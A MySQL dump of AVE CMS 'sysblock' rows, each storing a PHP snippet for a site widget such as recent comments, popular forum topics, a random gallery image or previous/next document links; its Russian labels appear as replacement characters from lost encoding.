INSERT INTO `cp_modul_sysblock` VALUES (2, '��������� �����������', '<br />\r\n<?php\r\n$limit = 3;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		cmnt.Author, \r\n		LEFT(cmnt.Text, 150) AS comment, \r\n		FROM_UNIXTIME(cmnt.Erstellt, ''%d.%m.%Y �. %H:%i'') AS date,\r\n		doc.Id,\r\n		doc.Titel, \r\n		doc.Url \r\n	FROM " . PREFIX . "_modul_comment_info AS cmnt \r\n	JOIN " . PREFIX . "_documents AS doc ON doc.Id = cmnt.DokId\r\n	WHERE Status = 1\r\n	ORDER BY cmnt.Id DESC \r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	$Url = ''index.php?id='' . $row->Id . ''&amp;doc='' \r\n		. (empty($row->Url) ? cpParseLinkname(stripslashes($row->Titel)) : $row->Url);\r\n	$Url = (CP_REWRITE == 1) ? cpRewrite($Url) : $Url;\r\n	echo ''<p><small>�������:'', htmlspecialchars($row->Author), '' � '',$row->date,''</small><a title="'', htmlspecialchars($row->Titel),\r\n		''"href="'', $Url, ''"><em>"'', htmlspecialchars($row->comment), (strlen($row->comment)==150 ? ''...'' : ''''), \r\n		''"</em></a></p><hr/>'';\r\n}\r\n?>');
INSERT INTO `cp_modul_sysblock` VALUES (3, '���������� �������', '<?php\r\n$limit = 3; // ���������� �������� � ������\r\n$i = 0;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		COUNT(cmnt.Id) AS comments, \r\n		doc.Id, \r\n		doc.Titel, \r\n		doc.Url \r\n	FROM " . PREFIX . "_modul_comment_info AS cmnt\r\n	JOIN " . PREFIX . "_documents AS doc ON doc.Id = cmnt.DokId\r\n	GROUP BY cmnt.DokId \r\n	ORDER BY comments DESC \r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	$Url = ''index.php?id='' . $row->Id . ''&amp;doc='' \r\n		. (empty($row->Url) ? cpParseLinkname(stripslashes($row->Titel)) : $row->Url);\r\n	$Url = (CP_REWRITE == 1) ? cpRewrite($Url) : $Url;\r\n	echo ''<strong>'', ++$i, ''.</strong> <a href="'', $Url, ''">'', \r\n		htmlspecialchars(substr($row->Titel, 0, 36)), ((strlen($row->Titel)>36) ? ''...'' : ''''), \r\n		''</a><p style="text-align:right;">(������������: '', $row->comments, '')</p>'';\r\n}\r\n?>\r\n');
INSERT INTO `cp_modul_sysblock` VALUES (4, '��������� ����� ���� � �����', '<?php\r\n  $daten = file("uploads/random/header_fon.htm");\r\n  @shuffle ($daten);\r\n  echo trim($daten[0]);\r\n?>');
INSERT INTO `cp_modul_sysblock` VALUES (5, '������� ����', '<?php\r  switch (date("F")){\r    case ''January'':   $month = ''������'';   break;\r    case ''February'':  $month = ''�������'';  break;\r    case ''March'':     $month = ''�����'';    break;\r    case ''April'':     $month = ''������'';   break;\r    case ''May'':       $month = ''���'';      break;\r    case ''June'':      $month = ''����'';     break;\r    case ''July'':      $month = ''����'';     break;\r    case ''August'':    $month = ''�������'';  break;\r    case ''September'': $month = ''��������''; break;\r    case ''October'':   $month = ''�������'';  break;\r    case ''November'':  $month = ''������'';   break;\r    case ''December'':  $month = ''�������'';  break;\r  }\r\r  switch (date("w")){\r    case ''0'': $day = ''�����������''; break;\r    case ''1'': $day = ''�����������''; break;\r    case ''2'': $day = ''�������''; break;\r    case ''3'': $day = ''�����''; break;\r    case ''4'': $day = ''�������''; break;\r    case ''5'': $day = ''�������''; break;\r    case ''6'': $day = ''�������''; break;\r  }\r\r  $now_date = date("$day, d ".$month." Y �.");\r  echo ''�������: '' . $now_date;\r?>');
INSERT INTO `cp_modul_sysblock` VALUES (6, '��������� �������', '<?php\r  $sql = $GLOBALS[''db'']->Query("SELECT Id FROM " . PREFIX . "_modul_gallery ORDER BY RAND() LIMIT 1");\r  $row = $sql->fetchrow();\r  include_once(BASE_DIR . ''/modules/gallery/modul.php'');\r  cpGallery($row->Id);\r?>');
INSERT INTO `cp_modul_sysblock` VALUES (7, '��������� ���������', '<div class="mod_searchbox"><strong>��������� ���������</strong><br />\r<br />\r<?php\r  $limit = 5; // ���������� ���������� � ������\r  $sql = $GLOBALS[''db'']->Query("SELECT * \r    FROM " . PREFIX . "_documents\r    WHERE Id != 1\r      AND Id != 2\r      AND Geloescht != 1\r      AND DokStatus != 0\r      AND (DokEnde = 0 || DokEnde > ".time().")\r      AND (DokStart = 0 || DokStart < ".time().")\r    ORDER BY DokStart DESC\r    LIMIT 0,$limit\r  ");\r  $outstring = '''';\r  $i = 0;\r  while ($row = $sql->fetchrow()) {\r    $Url = (CP_REWRITE==1) ? cp_rewrite(''index.php?id=''.$row->Id.''&amp;doc=''.cp_parse_linkname($row->Titel)) : ''index.php?id=''.$row->Id.''&amp;doc=''.cp_parse_linkname($row->Titel);\r    $outstring .= ''<strong>''.++$i.''.</strong> '';\r    $outstring .= ''<a href="''.$Url.''">''.substr($row->Titel, 0, 40).''''.((strlen($row->Titel)>40) ? ''...'' : '''').''</a><br />'';\r  }\r  $sql->Close();\r  echo $outstring;\r?></div>');
INSERT INTO `cp_modul_sysblock` VALUES (8, '�����: ���������� ����', '<div class="mod_searchbox"><strong>���������� ����</strong><br />\r<br />\r<ol> <?php\r  $limit = 5;\r  $sql = $GLOBALS[''db'']->Query("\r    SELECT topic.id,forum_id,title,views,replies,datum,BenutzerId,BenutzerName\r    FROM " . PREFIX . "_modul_forum_topic AS topic\r    LEFT JOIN " . PREFIX . "_modul_forum_userprofile AS user ON user.BenutzerId = uid\r    WHERE opened = 1\r    ORDER BY views DESC\r    LIMIT 0,$limit\r  ");\r  $outstring = '''';\r  while ($row = $sql->FetchRow()) {\r    $outstring .= ''<li>'';\r    $outstring .= ''<strong><a href="index.php?module=forums&show=showtopic&toid=''.$row->id.''&fid=''.$row->forum_id.''">''.htmlentities(stripslashes($row->title), ENT_NOQUOTES, "cp1251").''</a></strong><br />'';\r    $outstring .= ''���� c������ ''.date_format(date_create($row->datum),"d-m-Y �. � H:i");\r    $outstring .= '' ������������� <a href="index.php?module=forums&show=userprofile&user_id=''.$row->BenutzerId.''" class="name">''.htmlentities(stripslashes($row->BenutzerName), ENT_NOQUOTES, "cp1251").''</a><br />'';\r    $outstring .= '' (����������: ''.$row->views;\r    $outstring .= '', ���������: ''.$row->replies.'')'';\r    $outstring .= ''</li>'';\r  }\r  $sql->Close();\r  echo $outstring;\r?> </ol>\r    </div>');
INSERT INTO `cp_modul_sysblock` VALUES (9, '�����: ������ ���� � ����������', '<div class="mod_searchbox"><strong>������ ���� � ����������</strong><br />\r<br />\r<ol> <?php\r// ��� ������ ������ ������ ��� ����������� WHERE type = 1\r// ��� ������ ������ ���������� ����������� WHERE type = 100\r// ��� ������ ������ ��� � ���������� ����������� WHERE type != 0\r  $limit = 10;\r  $sql = $GLOBALS[''db'']->Query("\r    SELECT topic.id,forum_id,title,views,replies,datum,BenutzerId,BenutzerName\r    FROM " . PREFIX . "_modul_forum_topic AS topic\r    LEFT JOIN " . PREFIX . "_modul_forum_userprofile AS user ON user.BenutzerId = uid\r    WHERE type != 0\r    ORDER BY views DESC\r    LIMIT 0,$limit\r  ");\r  $outstring = '''';\r  while ($row = $sql->FetchRow()) {\r    $outstring .= ''<li>'';\r    $outstring .= ''<strong><a href="index.php?module=forums&show=showtopic&toid=''.$row->id.''&fid=''.$row->forum_id.''">''.htmlentities(stripslashes($row->title), ENT_NOQUOTES, "cp1251").''</a></strong><br />'';\r    $outstring .= ''���� c������ ''.date_format(date_create($row->datum),"d-m-Y �. � H:i");\r    $outstring .= '' ������������� <a href="index.php?module=forums&show=userprofile&user_id=''.$row->BenutzerId.''" class="name">''.htmlentities(stripslashes($row->BenutzerName), ENT_NOQUOTES, "cp1251").''</a><br />'';\r    $outstring .= '' (����������: ''.$row->views;\r    $outstring .= '', ���������: ''.$row->replies.'')'';\r    $outstring .= ''</li>'';\r  }\r  $sql->Close();\r  echo $outstring;\r?> </ol>\r    </div>');
INSERT INTO `cp_modul_sysblock` VALUES (10, '�����: �������� ���� �� ��������� 24 ����', '<?php\r  define ("MISCIDSINC", 1);\r  define ("FORUM_PERMISSION_CAN_SEE", 0);\r  define ("FORUM_STATUS_CLOSED", 1);\r  define ("FORUM_STATUS_MOVED", 2);\r  define ("BOARD_NEWPOSTMAXAGE", "-4 weeks");\r  define ("TOPIC_TYPE_STICKY", 1);\r  define ("TOPIC_TYPE_ANNOUNCE", 100);\r\r  include_once(BASE_DIR . ''/modules/forums/class.forums.php'');\r  include_once(BASE_DIR . ''/functions/func.modulglobals.php'');\r  if(defined(''T_PATH'')) $GLOBALS[''tmpl'']->assign(''cp_theme'', T_PATH);\r\r  modulGlobals(''forums'');\r\r  $forums = new Forum;\r\r  $GLOBALS[''tmpl'']->register_function(''get_post_icon'', ''getPostIcon'');\r\r  $GLOBALS[''mod''][''tpl_dir''] = BASE_DIR . ''/templates/''.T_PATH.''/modules/forums/templates/'';\r\r  $forums->last24();\r\r  echo MODULE_CONTENT;\r?>');
INSERT INTO `cp_modul_sysblock` VALUES (11, '��������� ����� ������ � �����', '<?php\r\n  $daten = file("uploads/random/header_text.htm");\r\n  @shuffle ($daten);\r\n  echo trim($daten[0]);\r\n?>');
INSERT INTO `cp_modul_sysblock` VALUES (12, '����� ����� �����', '<p>��������, ��. ������, �.1<br />\n���./����: (111) <strong>555-55-66</strong><br />\nEmail:<a href="mailto:info@mysite.ru"> info@mysite.ru</a></p>');
INSERT INTO `cp_modul_sysblock` VALUES (13, '������������ ����� 1, 2 � 3 ��� ����� ������', '<div class="searchbox">\r\n<h3>���������� �������</h3>\r\n<?php\r\n$limit = 3; // ���������� �������� � ������\r\n$i = 0;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		COUNT(cmnt.Id) AS comments, \r\n		doc.Id, \r\n		doc.Titel, \r\n		doc.Url \r\n	FROM " . PREFIX . "_modul_comment_info AS cmnt\r\n	JOIN " . PREFIX . "_documents AS doc ON doc.Id = cmnt.document_id\r\n	GROUP BY cmnt.document_id \r\n	ORDER BY comments DESC \r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	$Url = ''index.php?id='' . $row->Id . ''&amp;doc='' \r\n		. (empty($row->Url) ? cpParseLinkname(stripslashes($row->Titel)) : $row->Url);\r\n	$Url = (CP_REWRITE == 1) ? cpRewrite($Url) : $Url;\r\n	echo ''<strong>'', ++$i, ''.</strong> <a href="'', $Url, ''">'', \r\n		htmlspecialchars(substr($row->Titel, 0, 36)), ((strlen($row->Titel)>36) ? ''...'' : ''''), \r\n		''</a><p style="text-align:right;">(������������: '', $row->comments, '')</p>'';\r\n}\r\n?></div>\r\n<div class="searchbox">\r\n<h3>�������� ������������</h3>\r\n<?php\r\n$limit = 5;\r\n$i = 0;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		Author, \r\n		COUNT(author_id) AS comments\r\n	FROM " . PREFIX . "_modul_comment_info\r\n	WHERE author_id != ''0''\r\n	GROUP BY author_id\r\n	ORDER BY comments DESC\r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	echo ''<strong>'', ++$i, '' �����:</strong> '', htmlspecialchars($row->author), \r\n		''<br /><div style="text-align:right;font-size:11px;">(������������: '', \r\n		$row->comments, '')</div>'';\r\n}\r\n?></div>\r\n<div class="searchbox">\r\n<h3>����� �����������:</h3>\r\n<?php\r\n$limit = 3;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		cmnt.author, \r\n		LEFT(cmnt.message, 150) AS comment, \r\n		FROM_UNIXTIME(cmnt.published, ''%d.%m.%Y �. %H:%i'') AS date,\r\n		doc.Id,\r\n		doc.Titel, \r\n		doc.Url \r\n	FROM " . PREFIX . "_modul_comment_info AS cmnt \r\n	JOIN " . PREFIX . "_documents AS doc ON doc.Id = cmnt.document_id\r\n	WHERE status = 1\r\n	ORDER BY cmnt.Id DESC \r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	$Url = ''index.php?id='' . $row->Id . ''&amp;doc='' \r\n		. (empty($row->Url) ? cpParseLinkname(stripslashes($row->Titel)) : $row->Url);\r\n	$Url = (CP_REWRITE == 1) ? cpRewrite($Url) : $Url;\r\n	echo ''<small>�������:'', htmlspecialchars($row->author), ''<p>&quot;...<em>'', \r\n		htmlspecialchars($row->comment), (strlen($row->comment)==150 ? ''...'' : ''''), \r\n		''</em>&quot;</p><small>'', $row->date, '' | <a title="'', htmlspecialchars($row->Titel),\r\n		''" href="'', $Url, ''">���������...</a></small></small><hr/>'';\r\n}\r\n?></div>');
INSERT INTO `cp_modul_sysblock` VALUES (14, '��������� ����������� �� �������', '<?\r\nglobal $db;\r\n\r\nif (!function_exists(''imgType'')) \r\n{\r\n  function imgType($endg) \r\n  {\r\n    switch ($endg) {\r\n      case ''.jpg'' :\r\n      case ''jpeg'' :\r\n      case ''.jpe'' : $f_end = ''jpg''; break;\r\n      case ''.png'' : $f_end = ''png''; break;\r\n      case ''.gif'' : $f_end = ''gif''; break;\r\n      case ''.avi'' : $f_end = ''video''; break;\r\n      case ''.mov'' : $f_end = ''video''; break;\r\n      case ''.wmv'' : $f_end = ''video''; break;\r\n      case ''.wmf'' : $f_end = ''video''; break;\r\n      case ''.mpg'' : $f_end = ''video''; break;\r\n    }\r\n    return $f_end;\r\n  }\r\n}\r\n$sql = $db->Query("\r\n	SELECT \r\n		GalId, \r\n		GPfad, \r\n		Pfad, \r\n		Endung, \r\n		BildTitel \r\n	FROM " . PREFIX . "_modul_gallery_images \r\n	LEFT JOIN " . PREFIX . "_modul_gallery AS gal ON GalId = gal.Id \r\n	ORDER BY RAND() \r\n	LIMIT 4\r\n");\r\nwhile ($row = $sql->fetchrow()) {\r\n?><a onclick="popup(''index.php?module=gallery&amp;pop=1&amp;<?="s"?>ub=allimages&amp;gal_id=<?=$row->GalId?>&amp;cp_theme=<?=T_PATH?>'',''comment'',''720'',''750'',''1'');" href="javascript:void(0);"><img border="0" alt="<?=htmlspecialchars(stripslashes($row->BildTitel), ENT_QUOTES, ''cp1251'')?>" src="modules/gallery/thumb.php?file=<?=$row->Pfad?>&amp;type=<?=imgType($row->Endung)?>&amp;folder=<?=$row->GPfad?>" /></a><?}?>');
INSERT INTO `cp_modul_sysblock` VALUES (15, '�����', '<?php\r\n  $bg_position = array(0,-130,-260,-390,-520,-650);\r\n  shuffle ($bg_position);\r\n\r\n  $top_message = array(''��������� ����� ���������� ����� �������, �������� �� � ����� ��������, ������� ������ ����� ����������.'', ''������������ ����������� ���������� ������������� � ���������� �� �� ��������� ��������� ����� � ������������ �������� ������������� �����.'', ''������������� ��� ����������� �������� ������������� ����-������. �� ����� ��������  ����� ������ ����� ��� ����������� �����.'', ''���������������� ������� ���������� ���������. ����� �� ��������� ������� �� ������� ������� ���� �������� �������� .'', ''�������� ������� ������ ��������-��������. �������� ������� ��� �������� ������ ������� � ���������!'', ''������� ������� ���������� ��������� �����. ������� ������ ������� �������� �� �����������, ��������� ���� ��� ����������� ���������� ��������.'');\r\n  @shuffle ($top_message);\r\n\r\n  echo ''style="background: url(templates/aveold/images/fon_theme.jpg) no-repeat left '', $bg_position[0], ''px;"><div id="fon_login"><b>AVE CMS</b> - '', $top_message[0], ''</div'';\r\n?>');
INSERT INTO `cp_modul_sysblock` VALUES (16, '��������� �� ���������� �������', '<?php\r\nglobal $db;\r\n\r\n$curent_doc_id = currentId();\r\n$sql = $db->Query("\r\n	(SELECT\r\n		''prev'' AS doc_type,\r\n		prev.Id,\r\n		prev.Titel,\r\n		doc_field.Inhalt\r\n	FROM\r\n		" . PREFIX . "_documents AS prev\r\n	LEFT JOIN \r\n		" . PREFIX . "_documents AS curent \r\n			ON curent.RubrikId = prev.RubrikId\r\n	LEFT JOIN \r\n		" . PREFIX . "_document_fields AS doc_field \r\n			ON doc_field.DokumentId = prev.Id\r\n	WHERE\r\n		prev.Id >  ''2'' AND\r\n		curent.Id =  ''" . $curent_doc_id . "'' AND\r\n		prev.Id <>  ''" . $curent_doc_id . "'' AND\r\n		prev.DokStart <=  curent.DokStart AND\r\n		doc_field.RubrikFeld = (\r\n			SELECT\r\n				rub_field.Id\r\n			FROM\r\n				" . PREFIX . "_document_fields AS doc_field\r\n			LEFT JOIN \r\n				" . PREFIX . "_rubric_fields AS rub_field \r\n					ON rub_field.Id = doc_field.RubrikFeld\r\n			WHERE\r\n				doc_field.DokumentId =  ''" . $curent_doc_id . "''\r\n			ORDER BY\r\n				rub_field.rubric_position ASC\r\n			LIMIT 1\r\n		)\r\n	ORDER BY\r\n		prev.DokStart DESC\r\n	LIMIT 1)\r\n	\r\n	UNION\r\n	\r\n	(SELECT\r\n		''next'' AS doc_type,\r\n		next.Id,\r\n		next.Titel,\r\n		doc_field.Inhalt\r\n	FROM\r\n		" . PREFIX . "_documents AS next\r\n	LEFT JOIN \r\n		" . PREFIX . "_documents AS curent \r\n			ON curent.RubrikId = next.RubrikId\r\n	LEFT JOIN \r\n		" . PREFIX . "_document_fields AS doc_field \r\n			ON doc_field.DokumentId = next.Id\r\n	WHERE\r\n		next.Id >  ''2'' AND\r\n		curent.Id =  ''" . $curent_doc_id . "'' AND\r\n		next.Id <>  ''" . $curent_doc_id . "'' AND\r\n		next.DokStart >=  curent.DokStart AND\r\n		doc_field.RubrikFeld = (\r\n			SELECT\r\n				rub_field.Id\r\n			FROM\r\n				" . PREFIX . "_document_fields AS doc_field\r\n			LEFT JOIN \r\n				" . PREFIX . "_rubric_fields AS rub_field \r\n					ON rub_field.Id = doc_field.RubrikFeld\r\n			WHERE\r\n				doc_field.DokumentId =  ''" . $curent_doc_id . "''\r\n			ORDER BY\r\n				rub_field.rubric_position ASC\r\n			LIMIT 1\r\n		)\r\n	ORDER BY\r\n		next.DokStart ASC\r\n	LIMIT 1)\r\n");\r\nwhile ($row = $sql->fetchRow())\r\n{\r\n	$doc_navi[$row->doc_type] = $row;\r\n}\r\necho ''<table cellspacing="0" cellpadding="0" border="0" width="100%" id="docnavi"><tr><td align="left" width="50%" class="naviprev">'';\r\nif (isset($doc_navi[''prev'']))\r\n{\r\n	$prev_url = ''index.php?id='' . $doc_navi[''prev'']->Id . ''&'' . ''amp;doc='' . cpParseLinkname($doc_navi[''prev'']->Titel);\r\n	$prev_url = (CP_REWRITE==1) ? cpRewrite($prev_url) : $prev_url;\r\n	$prev_linkname = htmlspecialchars($doc_navi[''prev'']->Inhalt);\r\n	echo ''&larr;&nbsp;<a title="'', $prev_linkname, ''" href="'', $prev_url, ''">'', $prev_linkname, ''</a>''; \r\n}\r\necho ''</td><td align="right" width="50%" class="navinext">'';\r\nif (isset($doc_navi[''next'']))\r\n{\r\n	$next_url = ''index.php?id='' . $doc_navi[''next'']->Id . ''&'' . ''amp;doc='' . cpParseLinkname($doc_navi[''next'']->Titel);\r\n	$next_url = (CP_REWRITE==1) ? cpRewrite($next_url) : $next_url;\r\n	$next_linkname = htmlspecialchars($doc_navi[''next'']->Inhalt);\r\n	echo ''<a title="'', $next_linkname, ''" href="'', $next_url, ''">'', $next_linkname, ''</a>&nbsp;&rarr;''; \r\n}\r\necho ''</td></tr></table>'';\r\n?>');
INSERT INTO `cp_modul_sysblock` VALUES (17, '��������� �� ���������� ������� 2', '<?php\r\nglobal $db;\r\n\r\n$row_cur_doc = $db->Query("\r\n	SELECT \r\n		Id,\r\n		RubrikId,\r\n		DokStart\r\n	FROM \r\n		" . PREFIX . "_documents\r\n	WHERE \r\n		Id =  ''" . currentId() . "''\r\n")\r\n->fetchRow();\r\n\r\n$row = $db->Query("\r\n	SELECT Id\r\n	FROM " . PREFIX . "_rubric_fields\r\n	WHERE RubrikId = ''" . $row_cur_doc->RubrikId . "''\r\n	ORDER BY rubric_position ASC\r\n	LIMIT 1\r\n")\r\n->fetchRow();\r\n\r\n$doc_field_titel_id = $row->Id;\r\n$row_prev = $db->Query("\r\n	SELECT\r\n		Id,\r\n		Titel\r\n	FROM\r\n		" . PREFIX . "_documents\r\n	WHERE\r\n		Id > ''2'' AND\r\n		Id != ''" . $row_cur_doc->Id . "'' AND\r\n		RubrikId = ''" . $row_cur_doc->RubrikId . "'' AND\r\n		DokStart <= ''" . $row_cur_doc->DokStart . "''\r\n	ORDER BY\r\n		DokStart DESC\r\n	LIMIT 1\r\n")\r\n->fetchRow();\r\nif ($row_prev)\r\n{\r\n	$row = $db->Query("\r\n		SELECT Inhalt\r\n		FROM " . PREFIX . "_document_fields\r\n		WHERE\r\n			RubrikFeld = ''" . $doc_field_titel_id . "'' AND\r\n			DokumentId = ''" . $row_prev->Id . "''\r\n	")	\r\n	->fetchRow();\r\n	$row_prev->Inhalt = $row->Inhalt;\r\n}\r\n$row_next = $db->Query("\r\n	SELECT\r\n		Id,\r\n		Titel\r\n	FROM\r\n		" . PREFIX . "_documents\r\n	WHERE\r\n		Id >  ''2'' AND\r\n		Id != ''" . $row_cur_doc->Id . "'' AND\r\n		RubrikId = ''" . $row_cur_doc->RubrikId . "'' AND\r\n		DokStart >= ''" . $row_cur_doc->DokStart . "''\r\n	ORDER BY\r\n		DokStart ASC\r\n	LIMIT 1\r\n")\r\n->fetchRow();\r\nif ($row_next)\r\n{\r\n	$row = $db->Query("\r\n		SELECT Inhalt\r\n		FROM " . PREFIX . "_document_fields\r\n		WHERE\r\n			RubrikFeld = ''" . $doc_field_titel_id . "'' AND\r\n			DokumentId = ''" . $row_next->Id . "''\r\n	")\r\n	->fetchRow();\r\n	$row_next->Inhalt = $row->Inhalt;\r\n}\r\necho ''<table cellspacing="0" cellpadding="0" border="0" width="100%" id="docnavi"><tr><td align="left" width="50%" class="naviprev">'';\r\nif ($row_prev)\r\n{\r\n	$prev_url = ''index.php?id='' . $row_prev->Id . ''&'' . ''amp;doc='' . cpParseLinkname($row_prev->Titel);\r\n	$prev_url = (CP_REWRITE==1) ? cpRewrite($prev_url) : $prev_url;\r\n	$prev_linkname = htmlspecialchars($row_prev->Inhalt);\r\n	echo ''&larr;&nbsp;<a title="'', $prev_linkname, ''" href="'', $prev_url, ''">'', $prev_linkname, ''</a>''; \r\n}\r\necho ''</td><td align="right" width="50%" class="navinext">'';\r\nif ($row_next)\r\n{\r\n	$next_url = ''index.php?id='' . $row_next->Id . ''&'' . ''amp;doc='' . cpParseLinkname($row_next->Titel);\r\n	$next_url = (CP_REWRITE==1) ? cpRewrite($next_url) : $next_url;\r\n	$next_linkname = htmlspecialchars($row_next->Inhalt);\r\n	echo ''<a title="'', $next_linkname, ''" href="'', $next_url, ''">'', $next_linkname, ''</a>&nbsp;&rarr;''; \r\n}\r\necho ''</td></tr></table>'';\r\n?>');
INSERT INTO `cp_modul_sysblock` VALUES (18, '��������� �� ���������� ������� 3', '<?php\r\nglobal $db;\r\n\r\n$curent_doc_id = currentDocId();\r\n\r\n$row_cur = $AVE_DB->Query("\r\n	SELECT \r\n		rub.Id,\r\n		doc.RubrikId,\r\n		doc.DokStart\r\n	FROM \r\n		" . PREFIX . "_documents AS doc\r\n	JOIN\r\n		" . PREFIX . "_rubric_fields AS rub\r\n			USING(RubrikId)\r\n	WHERE \r\n		doc.Id =  ''" . $curent_doc_id . "''\r\n	ORDER BY \r\n		rubric_position ASC\r\n	LIMIT 1\r\n")\r\n->fetchRow();\r\n\r\n$row_prev = $AVE_DB->Query("\r\n	SELECT\r\n		doc.Id,\r\n		Titel,\r\n		Inhalt\r\n	FROM\r\n		cp_documents AS doc\r\n	JOIN\r\n		cp_document_fields AS fld\r\n			ON DokumentId = doc.Id\r\n	WHERE\r\n		doc.Id > ''2'' AND\r\n		doc.Id != ''" . $curent_doc_id . "'' AND\r\n		RubrikId = ''" . $row_cur->RubrikId . "'' AND\r\n		DokStart <= ''" . $row_cur->DokStart . "'' AND \r\n		RubrikFeld = ''" . $row_cur->Id . "''\r\n	ORDER BY\r\n		DokStart DESC\r\n	LIMIT 1\r\n")\r\n->fetchRow();\r\n\r\n$row_next = $AVE_DB->Query("\r\n	SELECT\r\n		doc.Id,\r\n		Titel,\r\n		Inhalt\r\n	FROM\r\n		cp_documents AS doc\r\n	JOIN\r\n		cp_document_fields AS fld\r\n			ON DokumentId = doc.Id\r\n	WHERE\r\n		doc.Id > ''2'' AND\r\n		doc.Id != ''" . $curent_doc_id . "'' AND\r\n		RubrikId = ''" . $row_cur->RubrikId . "'' AND\r\n		DokStart >= ''" . $row_cur->DokStart . "'' AND \r\n		RubrikFeld = ''" . $row_cur->Id . "''\r\n	ORDER BY\r\n		DokStart ASC\r\n	LIMIT 1\r\n")\r\n->fetchRow();\r\n\r\necho ''<table cellspacing="0" cellpadding="0" border="0" width="100%" id="docnavi"><tr><td align="left" width="50%" class="naviprev">'';\r\nif ($row_prev)\r\n{\r\n	$prev_url = ''index.php?id='' . $row_prev->Id . ''&'' . ''amp;doc='' . cpParseLinkname($row_prev->Titel);\r\n	$prev_url = (CP_REWRITE==1) ? cpRewrite($prev_url) : $prev_url;\r\n	$prev_linkname = htmlspecialchars($row_prev->Inhalt);\r\n	echo ''&larr;&nbsp;<a title="'', $prev_linkname, ''" href="'', $prev_url, ''">'', $prev_linkname, ''</a>''; \r\n}\r\necho ''</td><td align="right" width="50%" class="navinext">'';\r\nif ($row_next)\r\n{\r\n	$next_url = ''index.php?id='' . $row_next->Id . ''&'' . ''amp;doc='' . cpParseLinkname($row_next->Titel);\r\n	$next_url = (CP_REWRITE==1) ? cpRewrite($next_url) : $next_url;\r\n	$next_linkname = htmlspecialchars($row_next->Inhalt);\r\n	echo ''<a title="'', $next_linkname, ''" href="'', $next_url, ''">'', $next_linkname, ''</a>&nbsp;&rarr;''; \r\n}\r\necho ''</td></tr></table>'';\r\n?>');
INSERT INTO `cp_modul_sysblock` VALUES (19, '��������� �� ���������� ������� 4', '<?php\r\nglobal $db;\r\n\r\n$curent_doc_id = currentDocId();\r\n\r\n$row_prev = $db->Query("\r\n	SELECT\r\n		''prev'' AS doc_type,\r\n		prev.Id,\r\n		prev.Titel,\r\n		doc_field.Inhalt\r\n	FROM\r\n		" . PREFIX . "_documents AS prev\r\n	LEFT JOIN \r\n		" . PREFIX . "_documents AS curent \r\n			ON curent.RubrikId = prev.RubrikId\r\n	LEFT JOIN \r\n		" . PREFIX . "_document_fields AS doc_field \r\n			ON doc_field.DokumentId = prev.Id\r\n	WHERE\r\n		prev.Id >  ''2'' AND\r\n		curent.Id =  ''" . $curent_doc_id . "'' AND\r\n		prev.Id <>  ''" . $curent_doc_id . "'' AND\r\n		prev.DokStart <=  curent.DokStart AND\r\n		doc_field.RubrikFeld = (\r\n			SELECT\r\n				rub_field.Id\r\n			FROM\r\n				" . PREFIX . "_document_fields AS doc_field\r\n			LEFT JOIN \r\n				" . PREFIX . "_rubric_fields AS rub_field \r\n					ON rub_field.Id = doc_field.RubrikFeld\r\n			WHERE\r\n				doc_field.DokumentId =  ''" . $curent_doc_id . "''\r\n			ORDER BY\r\n				rub_field.rubric_position ASC\r\n			LIMIT 1\r\n		)\r\n	ORDER BY\r\n		prev.DokStart DESC\r\n	LIMIT 1\r\n")\r\n->fetchRow();\r\n\r\n$row_next = $db->Query("\r\n	SELECT\r\n		''next'' AS doc_type,\r\n		next.Id,\r\n		next.Titel,\r\n		doc_field.Inhalt\r\n	FROM\r\n		" . PREFIX . "_documents AS next\r\n	LEFT JOIN \r\n		" . PREFIX . "_documents AS curent \r\n			ON curent.RubrikId = next.RubrikId\r\n	LEFT JOIN \r\n		" . PREFIX . "_document_fields AS doc_field \r\n			ON doc_field.DokumentId = next.Id\r\n	WHERE\r\n		next.Id >  ''2'' AND\r\n		curent.Id =  ''" . $curent_doc_id . "'' AND\r\n		next.Id <>  ''" . $curent_doc_id . "'' AND\r\n		next.DokStart >=  curent.DokStart AND\r\n		doc_field.RubrikFeld = (\r\n			SELECT\r\n				rub_field.Id\r\n			FROM\r\n				" . PREFIX . "_document_fields AS doc_field\r\n			LEFT JOIN \r\n				" . PREFIX . "_rubric_fields AS rub_field \r\n					ON rub_field.Id = doc_field.RubrikFeld\r\n			WHERE\r\n				doc_field.DokumentId =  ''" . $curent_doc_id . "''\r\n			ORDER BY\r\n				rub_field.rubric_position ASC\r\n			LIMIT 1\r\n		)\r\n	ORDER BY\r\n		next.DokStart ASC\r\n	LIMIT 1\r\n")\r\n->fetchRow();\r\n\r\necho ''<table cellspacing="0" cellpadding="0" border="0" width="100%" id="docnavi"><tr><td align="left" width="50%" class="naviprev">'';\r\nif ($row_prev)\r\n{\r\n	$prev_url = ''index.php?id='' . $row_prev->Id . ''&'' . ''amp;doc='' . cpParseLinkname($row_prev->Titel);\r\n	$prev_url = (CP_REWRITE==1) ? cpRewrite($prev_url) : $prev_url;\r\n	$prev_linkname = htmlspecialchars($row_prev->Inhalt);\r\n	echo ''&larr;&nbsp;<a title="'', $prev_linkname, ''" href="'', $prev_url, ''">'', $prev_linkname, ''</a>''; \r\n}\r\necho ''</td><td align="right" width="50%" class="navinext">'';\r\nif ($row_next)\r\n{\r\n	$next_url = ''index.php?id='' . $row_next->Id . ''&'' . ''amp;doc='' . cpParseLinkname($row_next->Titel);\r\n	$next_url = (CP_REWRITE==1) ? cpRewrite($next_url) : $next_url;\r\n	$next_linkname = htmlspecialchars($row_next->Inhalt);\r\n	echo ''<a title="'', $next_linkname, ''" href="'', $next_url, ''">'', $next_linkname, ''</a>&nbsp;&rarr;''; \r\n}\r\necho ''</td></tr></table>'';\r\n?>');
